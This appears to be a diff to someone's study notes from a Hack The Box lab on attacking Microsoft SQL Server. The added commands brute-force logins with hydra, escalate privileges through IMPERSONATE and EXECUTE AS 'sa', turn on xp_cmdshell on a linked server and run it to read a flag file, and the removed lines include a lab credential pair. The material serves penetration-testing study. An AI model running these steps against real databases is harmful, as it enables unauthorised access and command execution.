@@ -3,7 +3,9 @@
 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
 ```
 
-```
+```bash
+# password attacking
+hydra -l john -P passjohn.txt -t 4 $target mssql
 # MSSQL Ping in Metasploit
 msf6 auxiliary(scanner/mssql/mssql_ping) > run
 ```
@@ -19,8 +21,9 @@ MarcosV999@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123
 MarcosV999@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 ```
 -  `-h` to disable headers and footers for a cleaner look.
-```
+```powershell
 # Windows - SQLCMD
+PS C:\Users\Fiona> SQLCMD.EXE -S $env:COMPUTERNAME
 C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
 C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 # If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
@@ -123,6 +126,11 @@ MarcosV999@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
 
 SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.
 ```
+1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+2> GO
+```
+
+```
 # Identify Users that We Can Impersonate
 1> SELECT distinct b.name
 2> FROM sys.server_permissions a
@@ -181,12 +189,23 @@ DESKTOP-MFERMN4\SQLEXPRESS          1
 ```
 Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
 ```
-1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-2> GO
+1> EXECUTE AS LOGIN = 'sa'
+2> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+3> GO
 
 ------------------------------ ------------------------------ ------------------------------ -----------
 DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
 ```
+
 ```
-### mssqlsvc:princess1
+1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+```
+
+```
+1> EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+2> GO
 ```
